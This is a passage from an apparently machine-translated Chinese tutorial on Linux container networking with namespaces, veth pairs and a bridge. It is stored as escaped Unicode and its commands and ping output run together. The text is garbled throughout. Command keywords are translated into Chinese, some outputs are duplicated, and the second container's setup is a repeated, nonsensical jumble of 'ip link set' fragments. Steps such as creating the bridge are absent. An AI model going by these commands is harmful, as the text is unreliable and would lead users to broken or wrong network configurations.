noop\u72b6\u6001\u5173\u95ed\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000\u94fe\u8def/\u4ee5\u592a96\uff1ae8\uff1ade\uff1a1d\uff1a22\uff1ae0 brd ff\uff1aff\u3002\n\u521b\u5efa\u540e\u7684veth0\u548cceth0\u90fd\u9a7b\u7559\u5728\u4e3b\u673a\u7684\u7f51\u7edc\u5806\u6808(\u4e5f\u79f0\u4e3a\u6839\u7f51\u7edc\u547d\u540d\u7a7a\u95f4)\u4e0a\u3002\u8981\u5c06\u6839\u547d\u540d\u7a7a\u95f4\u4e0enetns0\u547d\u540d\u7a7a\u95f4\u8fde\u63a5\u8d77\u6765\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u4e2d\u4e00\u4e2a\u8bbe\u5907\u4fdd\u7559\u5728\u6839\u547d\u540d\u7a7a\u95f4\u4e2d\uff0c\u5e76\u5c06\u53e6\u4e00\u4e2a\u79fb\u52a8\u5230netns0\u4e2d\uff1a\n$sudo ip link set ceth0 netns0#\u5217\u51fa\u6240\u6709\u8bbe\u5907\uff0c\u4ee5\u786e\u4fdd\u5176\u4e2d\u4e00\u4e2a\u8bbe\u5907\u4ece\u6839\u5806\u6808\u4e2d\u6d88\u5931$ip link1\uff1alo\uff1a&lt\uff1bloopback\uff0cup\uff0clow_up&gt\uff1bmtu 65536 qdisk noqueue state\u672a\u77e5\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000 link/loopback 00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a002\uff1aeth0\uff1a&lt\uff1bBroadcast\uff0cMulticast\uff0cUp\uff0cLow_Up&gt\uff1bMTU 1500 qdisk fq_codel\u72b6\u6001\u5411\u4e0a\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000\u94fe\u8def/\u4ee5\u592a52\uff1a54\uff1a00\uff1ae3\uff1a27\uff1a77 brd ff\uff1aff6\uff1aveth0@if5\uff1a&lt\uff1b\u5e7f\u64ad\uff0c\u591a\u64ad&gt\uff1bmtu 1500 qdisk noop\u72b6\u6001\u5411\u4e0b\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000\u94fe\u8def/\u4ee5\u592a96\uff1ae8\uff1ade\uff1a1d\uff1a22\uff1ae0 brd ff\uff1aff link-netns netns0\n\u4e00\u65e6\u6211\u4eec\u6253\u5f00\u8bbe\u5907\u5e76\u5206\u914d\u6b63\u786e\u7684IP\u5730\u5740\uff0c\u5176\u4e2d\u4e00\u4e2a\u8bbe\u5907\u4e0a\u51fa\u73b0\u7684\u4efb\u4f55\u6570\u636e\u5305\u90fd\u4f1a\u7acb\u5373\u5728\u8fde\u63a5\u4e24\u4e2a\u547d\u540d\u7a7a\u95f4\u7684\u5bf9\u7b49\u8bbe\u5907\u4e0a\u5f39\u51fa\u3002\u8ba9\u6211\u4eec\u4ece\u6839\u547d\u540d\u7a7a\u95f4\u5f00\u59cb\uff1a\n$sudo nsenter--net=/var/run/netns/netns0$ip link set lo up#whops$ip link set ceth0 up$ip addr add 172.18.0.10/16 dev ceth0$IP link1\uff1aLO\uff1a&lt\uff1bloopback\uff0cup\uff0clow_up&gt\uff1bmtu 65536 qdisk noqueue state\u672a\u77e5\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000 link/loopback 00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a00\uff1a005\uff1aceth0@if6\uff1a&lt\uff1b\u5e7f\u64ad\uff0c\u7ec4\u64ad\uff0c\u5411\u4e0a\uff0c\u4e0b_\u5411\u4e0a\u548c&gt;t\uff1bMTU 1500 qdisk noqueue state up\u6a21\u5f0f\u9ed8\u8ba4\u7ec4\u9ed8\u8ba4qlen 1000 link/ether 66\uff1a2D\uff1a24\uff1ae3\uff1a49\uff1a3f brd ff\uff1aff link-netnsid 0\u3002\n#from`netns0`\uff0cping root&#39\uff1bSveth0$PING-C2172.18.0.11PING 172.18.0.11(172.18.0.11)56(84)\u5b57\u8282\u6570\u636e\u3002\u6765\u81ea172.18.0.11\u768464\u5b57\u8282\u6570\u636e\uff1aicmp_seq=1TTL=64\u65f6\u95f4=0.038 ms64\u5b57\u8282\u6765\u81ea172.18.0.11\uff1aicmp_seq=2TTL=64\u65f6\u95f4=0.040\u6beb\u79d2--172.18.0.11 ping\u7edf\u8ba1\u6570\u636e--\u53d1\u90012\u4e2a\u5206\u7ec4\uff0c2\u4e2a\u63a5\u6536\uff0c0%\u5206\u7ec4\u4e22\u5931\uff0cTime 58msrttmin/avg/max/mdev=0.038/0.039/0.040/0.001 ms#Leave`netns0`$exit#from root\u547d\u540d\u7a7a\u95f4\uff0cping ceth0$ping-c 2 172.18.0.10PING 172.18.0.10(172.18.0.10)56(84)\u5b57\u8282\u6570\u636e\u3002172.18.0.10\u5f00\u59cb\u768464\u5b57\u8282\uff1aicmp_seq=1 ttl=64 time=0.073 ms64\u5b57\u8282from 172.18.0.10\uff1aicmp_seq=2 ttl=64 time=0.046 ms--172.18.0.10 ping\u7edf\u8ba1--2\u4e2a\u53d1\u9001\u7684\u6570\u636e\u5305\uff0c2\u4e2a\u63a5\u6536\u7684\u6570\u636e\u5305\uff0c0%\u4e22\u5305\u7387\uff0c\u65f6\u95f43msrtt min/avg/max/mdev=0.046/0.059/0.073/0.015 ms\u3002\n\u540c\u65f6\uff0c\u5982\u679c\u6211\u4eec\u8bd5\u56fe\u8bbf\u95eenetns0\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u4efb\u4f55\u5176\u4ed6\u5730\u5740\uff0c\u6211\u4eec\u90fd\u4e0d\u4f1a\u6210\u529f\uff1a\n#inside root\u547d\u540d\u7a7a\u95f4$ip addr show dev eth02\uff1aeth0\uff1a&lt\uff1bBroadcast\uff0cMulticast\uff0cUp\uff0cLow_Up&gt\uff1bMTU 1500 qdisk fq_codel state up group default qlen 1000 link/ether 52\uff1a54\uff1a00\uff1ae3\uff1a27\uff1a77 brd ff\uff1aff inet 10.0.2.15/24 brd 10.0.2.255 Scope global dynamic noprefixroute eth0 Valid_lft 84057sec Preference_lft 84057sec inet6 fe80\uff1a\uff1a5054\uff1aff\uff1aFee3\uff1a2777/64 Scope link Valid_lft Forever_lft ever#\u8bb0\u4f4f\u8fd9\u4e2a10.0.2.15$sudo nsenter-net=/var/run/netns/netns0#try host&#39\uff1bS eth0$ping 10.0.2.15connect\uff1a\u7f51\u7edc\u65e0\u6cd5\u8bbf\u95ee#\u5c1d\u8bd5\u4eceInternet\u8fdb\u884c\u64cd\u4f5c$ping 8.8.8connect\uff1a\u7f51\u7edc\u65e0\u6cd5\u8bbf\u95ee\u3002\n\u4e0d\u8fc7\uff0c\u8fd9\u5f88\u5bb9\u6613\u89e3\u91ca\u3002\u5728netns0\u8def\u7531\u8868\u4e2d\u6839\u672c\u6ca1\u6709\u6b64\u7c7b\u6570\u636e\u5305\u7684\u8def\u7531\u3002\u5176\u4e2d\u552f\u4e00\u7684\u6761\u76ee\u663e\u793a\u5982\u4f55\u5230\u8fbe172.18.0.0/16\u7f51\u7edc\uff1a\nLinux\u6709\u5f88\u591a\u65b9\u6cd5\u53ef\u4ee5\u586b\u5145\u8def\u7531\u8868\u3002\u5176\u4e2d\u4e4b\u4e00\u662f\u4ece\u76f4\u8fde\u7f51\u7edc\u63a5\u53e3\u63d0\u53d6\u8def\u7531\u3002\u8bf7\u8bb0\u4f4f\uff0cnetns0\u4e2d\u7684\u8def\u7531\u8868\u5728\u547d\u540d\u7a7a\u95f4\u521b\u5efa\u540e\u7acb\u5373\u4e3a\u7a7a\u3002\u4f46\u662f\uff0c\u6211\u4eec\u5728\u5176\u4e2d\u6dfb\u52a0\u4e86ceth0\u8bbe\u5907\uff0c\u5e76\u4e3a\u5176\u5206\u914d\u4e86IP\u5730\u5740172.18.0.10/16\u3002\u7531\u4e8e\u6211\u4eec\u4f7f\u7528\u7684\u4e0d\u662f\u7b80\u5355\u7684IP\u5730\u5740\uff0c\u800c\u662f\u5730\u5740\u548c\u7f51\u7edc\u63a9\u7801\u7684\u7ec4\u5408\uff0c\u56e0\u6b64\u7f51\u7edc\u5806\u6808\u8bbe\u6cd5\u4ece\u4e2d\u63d0\u53d6\u4e86\u8def\u7531\u4fe1\u606f\u3002\u53d1\u5f80172.18.0.0/16\u7f51\u7edc\u7684\u6bcf\u4e2a\u6570\u636e\u5305\u90fd\u5c06\u901a\u8fc7ceth0\u8bbe\u5907\u53d1\u9001\u3002\u4f46\u4efb\u4f55\u5176\u4ed6\u6570\u636e\u5305\u90fd\u5c06\u88ab\u4e22\u5f03\u3002\u540c\u6837\uff0c\u6839\u547d\u540d\u7a7a\u95f4\u4e2d\u4e5f\u6709\u4e00\u6761\u65b0\u8def\u7531\uff1a\n#From`root`\u547d\u540d\u7a7a\u95f4\uff1a$IP ROUTE#...\u3002\u7701\u7565\u884c...172.18.0.0/16 dev veth0\u534f\u8bae\u5185\u6838\u4f5c\u7528\u57df\u94fe\u63a5src 172.18.0.11\n\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u6211\u4eec\u5df2\u7ecf\u51c6\u5907\u597d\u5c06\u6211\u4eec\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\u6807\u8bb0\u4e3a\u5df2\u56de\u7b54\u3002\u6211\u4eec\u73b0\u5728\u77e5\u9053\u5982\u4f55\u9694\u79bb\u3001\u865a\u62df\u5316\u548c\u8fde\u63a5Linux\u7f51\u7edc\u5806\u6808\u3002\n\u96c6\u88c5\u7bb1\u5316\u7684\u6574\u4e2a\u7406\u5ff5\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u9ad8\u6548\u7684\u8d44\u6e90\u5171\u4eab\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u53f0\u673a\u5668\u53ea\u6709\u4e00\u4e2a\u5bb9\u5668\u7684\u60c5\u51b5\u5e76\u4e0d\u5e38\u89c1\u3002\u76f8\u53cd\uff0c\u76ee\u6807\u662f\u5728\u5171\u4eab\u73af\u5883\u4e2d\u8fd0\u884c\u5c3d\u53ef\u80fd\u591a\u7684\u72ec\u7acb\u8fdb\u7a0b\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u6309\u7167\u4e0a\u9762\u7684Veth\u65b9\u6cd5\u5c06\u591a\u4e2a\u5bb9\u5668\u653e\u5728\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\uff0c\u4f1a\u53d1\u751f\u4ec0\u4e48\u5462\uff1f\u8ba9\u6211\u4eec\u6dfb\u52a0\u7b2c\u4e8c\u4e2a\u5bb9\u5668\uff1a\n#from root\u547d\u540d\u7a7a\u95f4$sudo ip netns add netns1$sudo ip link add veth1 type veth\u5bf9\u7b49\u540d\u79f0ceth1$sudo IP\u94fe\u8def\u96c6ceth1 netns1$sudo IP\u94fe\u8def\u96c6veth1 up$sudo IP addr add 172.18.0.21/16 dev ceth1$sudo nsenter--net=/var/run/netns/netns1$IP link set lo up$IP link set ceth1 up$IP addr add 172.18.0.20/16 dev ceth1\u3002\n#from`netns1`\u6211\u4eec\u65e0\u6cd5\u5230\u8fbe\u6839\u547d\u540d\u7a7a\u95f4\uff01$ping-c 2 172.18.0.21PING 172.18.0.21(172.18.0.21)56(84)\u5b57\u8282\u7684\u6570\u636e\u3002From 172.18.0.20 icmp_seq=1\u4e2a\u76ee\u6807\u4e3b\u673a\u65e0\u6cd5\u5230\u8fbeFrom 172.18.0.20 icmp_seq=2\u4e2a\u76ee\u6807\u4e3b\u673a\u65e0\u6cd5\u5230\u8fbe--172.18.0.21 ping\u7edf\u8ba1\u4fe1\u606f--2\u4e2a\u6570\u636e\u5305\u4f20\u8f93\uff0c0\u4e2a\u63a5\u6536\uff0c+2\u4e2a\u9519\u8bef\uff0c100%\u6570\u636e\u5305\u4e22\u5931\uff0cTime 55mspipe 2#\u4f46\u662f\u6709\u4e00\u6761\u8def\u7531\uff01$ip route172.18.0.0/16 dev ceth1 proto kernel\u4f5c\u7528\u57df\u94fe\u8defsrc 172.18.0.20#\u79bb\u5f00\u6839\u547d\u540d\u7a7a\u95f4\u4e2d\u7684`netns1`$exit#\u6211\u4eec\u65e0\u6cd5\u5230\u8fbe`netns1`$ping-c 2 172.18.0.20PING 172.18.0.20(172.18.0.20)56(84)\u5b57\u8282\u7684\u6570\u636e\u3002\u6765\u81ea172.18.0.11 icmp_seq=1\u76ee\u6807\u4e3b\u673a\u65e0\u6cd5\u5230\u8fbe\u6765\u81ea172.18.0.11 icmp_seq=2\u76ee\u6807\u4e3b\u673a\u65e0\u6cd5\u5230\u8fbe--172.18.0.20 ping\u7edf\u8ba1\u4fe1\u606f--2\u4e2a\u6570\u636e\u5305\u3002+2\u4e2a\u9519\u8bef\uff0c100%\u4e22\u5305\uff0c\u65f6\u95f423mspipe 2#\u4ece`netns0`\u5f00\u59cb\u6211\u4eec\u53ef\u4ee5\u5230\u8fbe`veth1`$sudo nsenter--net=/var/run/netns/netns0$ping-c 2 172.18.0.21PING 172.18.0.21(172.18.0.21)56(84)\u5b57\u8282\u6570\u636e\u3002172.18.0.21\u4e2d\u768464\u5b57\u8282\uff1aicmp_seq=1 ttl=64 time=0.037 ms64\u5b57\u8282from 172.18.0.21\uff1aicmp_seq=2 ttl=64 time=0.046\u6beb\u79d2--172.18.0.21 ping\u7edf\u8ba1\u4fe1\u606f--2\u4e2a\u5df2\u53d1\u9001\u7684\u4fe1\u606f\u5305\uff0c2\u4e2a\u5df2\u63a5\u6536\uff0c0%\u4fe1\u606f\u5305\u4e22\u5931\uff0c64\u4e2a\u4fe1\u606f\u5305\u4e22\u5931\uff0c\u4ece172.18.0.21\u5f00\u59cb\u300221\uff1aicmp_seq=2 ttl=64 time=0.046 ms-172.18.0.21 ping\u7edf\u8ba1\u4fe1\u606f--2\u4e2a\u4fe1\u606f\u5305\u5df2\u4f20\u8f93\uff0c2\u4e2a\u63a5\u6536\uff0c0%\u4fe1\u606f\u5305\u4e22\u5931\uff0c64\u4e2a\u4fe1\u606f\u5305\u4e22\u5931\uff0c\u4ece172.18.0.21\u5f00\u59cb\u3002Time 33msrtt min/avg/max/mdev=0.037/0.041/0.046/0.007 ms#\uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u65e0\u6cd5\u8fbe\u5230`netns1`$ping-c 2 172.18.0.20PING 172.18.0.20(172.18.0.20)56(84)\u5b57\u8282\u7684\u6570\u636e\u3002\u4ece172.18.0.10 icmp_seq=1\u4e2a\u76ee\u6807\u4e3b\u673a\u65e0\u6cd5\u5230\u8fbe\u4ece172.18.0.10 icmp_seq=2\u4e2a\u76ee\u6807\u4e3b\u673a\u65e0\u6cd5\u5230\u8fbe--172.18.0.20 ping\u7edf\u8ba1\u4fe1\u606f-2\u4e2a\u6570\u636e\u5305\uff0c0\u4e2a\u63a5\u6536\uff0c+2\u4e2a\u9519\u8bef\uff0c100%\u6570\u636e\u5305\u4e22\u5931\uff0c\u65f6\u95f463mspipe 2\u3002\n\u54ce\u54df\uff01\u6709\u4e9b\u4e8b\u4e0d\u5bf9\u52b2\u3002Netns1\u5904\u4e8e\u4e0d\u786e\u5b9a\u72b6\u6001\u3002\u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0c\u5b83\u4e0d\u80fd\u4e0e\u6839\u901a\u4fe1\uff0c\u6211\u4eec\u4e5f\u4e0d\u80fd\u4ece\u6839\u547d\u540d\u7a7a\u95f4\u8bbf\u95ee\u5b83\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u4e24\u4e2a\u5bb9\u5668\u9a7b\u7559\u5728\u76f8\u540c\u7684IP\u7f51\u7edc172.18.0.0/16\u4e2d\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u4ecenetns0\u5bb9\u5668\u4e0e\u4e3b\u673a\u7684veth1\u5bf9\u8bdd\u3002\u6709\u610f\u601d.\u3002\n\u55ef\uff0c\u6211\u82b1\u4e86\u4e00\u4e9b\u65f6\u95f4\u624d\u5f04\u660e\u767d\uff0c\u4f46\u663e\u7136\u6211\u4eec\u6b63\u9762\u4e34\u8def\u7ebf\u51b2\u7a81\u3002\u8ba9\u6211\u4eec\u68c0\u67e5\u6839\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u8def\u7531\u8868\uff1a\n$IP\u8def\u7531\u53f7...\u3002\u7701\u7565\u884c...#172.18.0.0/16 dev veth0\u534f\u8bae\u5185\u6838\u4f5c\u7528\u57df\u94fe\u63a5src 172.18.0.11172.18.0.0/16 dev veth1\u534f\u8bae\u5185\u6838\u4f5c\u7528\u57df\u94fe\u63a5src 172.18.0.21\u3002\n\u5373\u4f7f\u5728\u6dfb\u52a0\u7b2c\u4e8c\u4e2aveth\u5bf9\u4e4b\u540e\uff0croot\u7684\u7f51\u7edc\u5806\u6808\u83b7\u77e5\u4e86\u65b0\u7684\u8def\u7531172.18.0.0/16dev veth1 proto kernel scope link src 172.18.0.21\uff0c\u4f46\u662f\u5df2\u7ecf\u6709\u4e86\u5b8c\u5168\u76f8\u540c\u7f51\u7edc\u7684\u73b0\u6709\u8def\u7531\u3002\u5f53\u7b2c\u4e8c\u4e2a\u5bb9\u5668\u5c1d\u8bd5ping veth1\u8bbe\u5907\u65f6\uff0c\u9009\u62e9\u7684\u7b2c\u4e00\u6761\u8def\u7531\u4f1a\u4e2d\u65ad\u8fde\u63a5\u3002\u5982\u679c\u6211\u4eec\u5220\u9664\u7b2c\u4e00\u4e2a\u8def\u7531sudo ip route delete 172.18.0.0/16dev veth0 proto kernel scope link src 172.18.0.11\u5e76\u91cd\u65b0\u68c0\u67e5\u8fde\u63a5\uff0c\u60c5\u51b5\u5c06\u53d8\u6210\u955c\u50cf\u60c5\u51b5\u3002\u5373NetNS1\u7684\u8fde\u901a\u6027\u5c06\u88ab\u6062\u590d\uff0c\u4f46\u662fNetNS1\u5c06\u5904\u4e8e\u4e0d\u786e\u5b9a\u72b6\u6001\u3002\n\u55ef\uff0c\u6211\u76f8\u4fe1\u5982\u679c\u6211\u4eec\u4e3anetns1\u9009\u62e9\u53e6\u4e00\u4e2aIP\u7f51\u7edc\uff0c\u4e00\u5207\u90fd\u4f1a\u6b63\u5e38\u7684\u3002\u4f46\u662f\uff0c\u4f4d\u4e8e\u4e00\u4e2aIP\u7f51\u7edc\u4e2d\u7684\u591a\u4e2a\u5bb9\u5668\u662f\u5408\u6cd5\u7684\u4f7f\u7528\u6848\u4f8b\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u4ee5\u67d0\u79cd\u65b9\u5f0f\u8c03\u6574Veth\u65b9\u6cd5\u3002\n\u770b\u770bLinux\u6865-\u53c8\u4e00\u4e2a\u865a\u62df\u5316\u7684\u7f51\u7edc\u8bbe\u65bd\uff01Linux\u7f51\u6865\u7684\u884c\u4e3a\u7c7b\u4f3c\u4e8e\u7f51\u7edc\u4ea4\u6362\u673a\u3002\u5b83\u5728\u4e0e\u5176\u8fde\u63a5\u7684\u63a5\u53e3\u4e4b\u95f4\u8f6c\u53d1\u6570\u636e\u5305\u3002\u7531\u4e8e\u5b83\u662f\u4e00\u53f0\u4ea4\u6362\u673a\uff0c\u56e0\u6b64\u5b83\u5728L2(\u5373\u4ee5\u592a\u7f51)\u7ea7\u522b\u4e0a\u6267\u884c\u6b64\u64cd\u4f5c\u3002\n\u8ba9\u6211\u4eec\u8bd5\u7740\u73a9\u6211\u4eec\u7684\u65b0\u73a9\u5177\u5427\u3002\u4f46\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u6e05\u7406\u73b0\u6709\u7684\u8bbe\u7f6e\uff0c\u56e0\u4e3a\u6211\u4eec\u5230\u76ee\u524d\u4e3a\u6b62\u6240\u505a\u7684\u4e00\u4e9b\u914d\u7f6e\u66f4\u6539\u4e0d\u518d\u771f\u6b63\u9700\u8981\u3002\u5220\u9664\u7f51\u7edc\u547d\u540d\u7a7a\u95f4\u5c31\u8db3\u591f\u4e86\uff1a\n$sudo ip netns\u5220\u9664netns0$sudo ip netns\u5220\u9664netns1#\u4f46\u5982\u679c\u60a8\u4ecd\u6709\u4e00\u4e9b\u5269\u4f59...$sudo IP link delete veth0$sudo IP link delete ceth0$sudo IP link delete veth1$sudo IP link delete ceth1\u3002\n\u5feb\u901f\u91cd\u65b0\u521b\u5efa\u4e24\u4e2a\u5bb9\u5668\u3002\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u4e0d\u4f1a\u4e3a\u65b0\u7684veth0\u548cveth1\u8bbe\u5907\u5206\u914d\u4efb\u4f55IP\u5730\u5740\uff1a\n$sudo ip netns add netns0$sudo ip link add veth0 type veth Peer name ceth0$sudo IP link set veth0 up$sudo IP link set ceth0 netns0$sudo nsenter--net=/var/run/netns/netns0$IP link set lo up$IP addr add 172.18.0.10/16 dev ceth0$exit$sudo IP link add veth1 type veth Peer name ceth1$sudo IP link set veth1 up$sudo IP link set netnsenter-net=/var/run/netns/netns1$IP link up$IP link up$ip add1 addns1 up$sudo IP link set ceth1$sudo IP link set veth1 up$sudo IP link set ceth1$sudo IP link set veth1 up$sudo IP link set ceth1$sudo IP link set veth1 up$sudo IP link set ceth1$sudo IP link set veth1 up$sudo IP link set ceth1 netns1$sudo IP link set veth1 up$sudo IP link set ceth1$ip add1\u3002\u6dfb\u52a0172.18.0.20/16 dev ceth1$exit\u3002\n$ip routedefault via 10.0.2.2 dev eth0 proto dhcp\u6307\u680710010.0.2.0/24 dev eth0\u534f\u8bae\u5185\u6838\u8303\u56f4\u94fe\u8def\u6e9010.0.2.15\u6307\u6807100\u3002\n$sudo IP\u94fe\u8def\u96c6veth0\u4e3bbr0$sudo IP\u94fe\u8def\u96c6veth1\u4e3bbr0\n$sudo nsenter--net=/var/run/netns/netns0$ping-c 2 172.18.0.20PING 172.18.0.20(172.18.0.20)56(84)\u5b57\u8282\u6570\u636e\u3002\u6765\u81ea172.18.0.20\u768464\u5b57\u8282\u6570\u636e\uff1aicmp_seq=1ttl=64 time=0.259 ms64\u5b57\u8282from 172.18.0.20\uff1aicmp_seq=2ttl=64 time=0.051 ms-172.18.0.20 ping\u7edf\u8ba1\u6570\u636e--2\u4e2a\u6570\u636e\u5305\u5df2\u53d1\u9001\uff0c2\u4e2a\u5df2\u63a5\u6536\uff0c0%\u6570\u636e\u5305\u4e22\u5931\uff0c\u65f6\u95f42msrtt min/avg/max/mdev=0.051/0.155/0.259/0.104 ms\u3002\n$sudo nsenter--net=/var/run/netns/netns1$ping-c 2 172.18.0.10PING 172.18.0.10(172.18.0.10)56(84)\u5b57\u8282\u6570\u636e\u3002\u6765\u81ea172.18.0.10\u768464\u5b57\u8282\u6570\u636e\uff1aicmp_seq=1ttl=64 time=0.037 ms64\u5b57\u8282from 172.18.0.10\uff1aicmp_seq=2ttl=64 time=0.089 ms-172.18.0.10 ping\u7edf\u8ba1\u6570\u636e--2\u4e2a\u6570\u636e\u5305\u5df2\u53d1\u9001\uff0c2\u4e2a\u5df2\u63a5\u6536\uff0c0%\u6570\u636e\u5305\u4e22\u5931\uff0c\u65f6\u95f436msrtt min/avg/max/mdev=0.037/0.063/0.089/0.026 ms\u3002\n\u53ef\u7231\u7684!\u3002\u4e00\u5207\u90fd\u8fd0\u8f6c\u5f97\u5f88\u597d\u3002\u4f7f\u7528\u8fd9\u79cd\u65b0\u65b9\u6cd5\uff0c\u6211\u4eec\u6839\u672c\u6ca1\u6709\u914d\u7f6eveth0\u548cveth1\u3002\u6211\u4eec\u4ec5\u5206\u914d\u4e86\u4e24\u4e2aIP\u5730\u5740\uff0c\u5206\u522b\u4f4d\u4e8eceth0\u548cceth1\u4e24\u7aef\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u5b83\u4eec\u4f4d\u4e8e\u540c\u4e00\u4ee5\u592a\u7f51\u6bb5(\u8bf7\u8bb0\u4f4f\uff0c\u6211\u4eec\u5c06\u5b83\u4eec\u8fde\u63a5\u5230\u865a\u62df\u4ea4\u6362\u673a)\uff0c\u56e0\u6b64\u5728\u7b2c2\u5c42\u4e0a\u5b58\u5728\u8fde\u63a5\uff1a\n$sudo nsenter--net=/var/run/netns/netns0$ip he172.18.0.20 dev ceth0 lladdr 6e\uff1a9c\uff1aae\uff1a02\uff1a60\uff1ade stale$exit$sudo nsenter--net=/var/run/netns/netns1$ip\u90bb\u5c45172.18.0.10 dev ceth1 lladdr 66\uff1aF3\uff1a8c\uff1a75\uff1a09\uff1a29 stale$exit\u3002\n\u795d\u8d3a\u4f60\uff0c\u6211\u4eec\u5b66\u4f1a\u4e86\u5982\u4f55\u628a\u96c6\u88c5\u7bb1\u53d8\u6210\u53cb\u597d\u7684\u90bb\u5c45\uff0c\u9632\u6b62\u4ed6\u4eec\u7684\u5e72\u6270\uff0c\u4f46\u53c8\u4fdd\u6301\u4e86\u8fde\u901a\u6027\u3002\n\u6211\u4eec\u7684\u96c6\u88c5\u7bb1\u53ef\u4ee5\u4e92\u76f8\u901a\u4fe1\u3002\u4f46\u662f\u5b83\u4eec\u80fd\u4e0e\u4e3b\u673a(\u5373\u6839\u547d\u540d\u7a7a\u95f4)\u5bf9\u8bdd\u5417\uff1f\n#\u4f7f\u7528exit\u5148\u4fdd\u7559`netns0`\uff1a$ping-c 2 172.18.0.10PING 172.18.0.10(172.18.0.10)56(84)\u5b57\u8282\u6570\u636e\u3002From 213.51.1.123 icmp_seq=1\u76ee\u7684\u7f51\u7edc\u4e0d\u53ef\u8fbeFrom 213.51.1.123 icmp_seq=2\u76ee\u7684\u7f51\u7edc\u4e0d\u53ef\u8fbe--172.18.0.10 ping\u7edf\u8ba1--2\u4e2a\u6570\u636e\u5305\u4f20\u8f93\uff0c0\u4e2a\u63a5\u6536\uff0c+2\u4e2a\u9519\u8bef\uff0c100%\u4e22\u5305\uff0c\u65f6\u95f43ms$ping-c 2 172.18.0.20 ping 172.18.0.20(172.18.0.20)56(84)\u5b57\u8282\u6570\u636e\u3002\u4ece213.51.1.123 icmp_seq=1\u76ee\u7684\u7f51\u7edc\u4e0d\u53ef\u8fbe\u81ea213.51.1.123 icmp_seq=2\u76ee\u7684\u7f51\u7edc\u4e0d\u53ef\u8fbe-172.18.0.20 ping\u7edf\u8ba1\u4fe1\u606f-2\u4e2a\u6570\u636e\u5305\u4f20\u8f93\uff0c0\u4e2a\u63a5\u6536\uff0c+2\u4e2a\u9519\u8bef\uff0c100%\u4e22\u5305\uff0c\u65f6\u95f43ms\u3002\n\u8981\u5728\u6839\u547d\u540d\u7a7a\u95f4\u548c\u5bb9\u5668\u547d\u540d\u7a7a\u95f4\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\uff0c\u6211\u4eec\u9700\u8981\u5c06IP\u5730\u5740\u5206\u914d\u7ed9\u7f51\u6865\u7f51\u7edc\u63a5\u53e3\uff1a\n\u4e00\u65e6\u6211\u4eec\u4e3a\u7f51\u6865\u63a5\u53e3\u5206\u914d\u4e86IP\u5730\u5740\uff0c\u4e3b\u673a\u8def\u7531\u8868\u4e0a\u5c31\u6709\u4e86\u4e00\u6761\u8def\u7531\uff1a\n$IP\u8def\u7531\u53f7...\u3002\u7701\u7565\u884c...172.18.0.0/16 dev br0\u534f\u8bae\u5185\u6838\u4f5c\u7528\u57df\u94fe\u63a5src 172.18.0.1$ping-c 2 172.18.0.10PING 172.18.0.10(172.18.0.10)56(84)\u5b57\u8282\u6570\u636e\u3002172.18.0.10\uff1aicmp_seq=1ttl=64 time=0.036 ms64 byte from 172.18.0.10\uff1aicmp_seq=2ttl=64 time=0.049 ms-172.18.0.10 ping\u7edf\u8ba1\u6570\u636e-2\u4e2a\u6570\u636e\u5305\u5df2\u53d1\u9001\uff0c2\u4e2a\u5df2\u63a5\u6536\uff0c0%\u6570\u636e\u5305\u4e22\u5931\uff0c\u65f6\u95f411msrttmin/avg/max/mdev=0.036/0.042/0.049/0.009\u6beb\u79d2$PING-C2172.18.0.20PING 172.18.0.20(172.18.0.20)56(84)\u5b57\u8282\u6570\u636e\u6765\u81ea172.18.0.20\u768464\u5b57\u8282\uff1aicmp_seq=1TTL=64time=0.059 ms64\u5b57\u8282\u6765\u81ea172.18.0.20\uff1aicmp_seq=2ttl=64\u65f6\u95f4=0.056\u6beb\u79d2-172.18.0.20 ping\u7edf\u8ba1-\u53d1\u90012\u4e2a\u5206\u7ec4\uff0c2\u4e2a\u63a5\u6536\uff0c0%\u5206\u7ec4\u4e22\u5931\uff0c\u65f6\u95f44msrtt min/avg/max/mdev=0.056/0.057/0.059/0.007 ms\u3002\n\u5bb9\u5668\u53ef\u80fd\u8fd8\u5177\u6709ping\u7f51\u6865\u63a5\u53e3\u7684\u80fd\u529b\uff0c\u4f46\u5b83\u4eec\u4ecd\u7136\u65e0\u6cd5\u8fde\u63a5\u5230\u4e3b\u673a\u7684eth0\u3002\u6211\u4eec\u9700\u8981\u6dfb\u52a0\u5bb9\u5668\u7684\u9ed8\u8ba4\u8def\u7531\uff1a\n$sudo nsenter--net=/var/run/netns/netns0$ip route\u901a\u8fc7172.18.0.1$ping-c 2 10.0.2.15PING 10.0.2.15(10.0.2.15)56(84)\u5b57\u8282\u6570\u636e\u6dfb\u52a0\u9ed8\u8ba4\u503c\u3002\u6765\u81ea10.0.2.15\u768464\u5b57\u8282\uff1aicmp_seq=1ttl=64 time=0.036 ms64\u5b57\u8282from 10.0.2.15\uff1aicmp_seq=2 ttl=64 time=0.053 ms-10.0.2.15 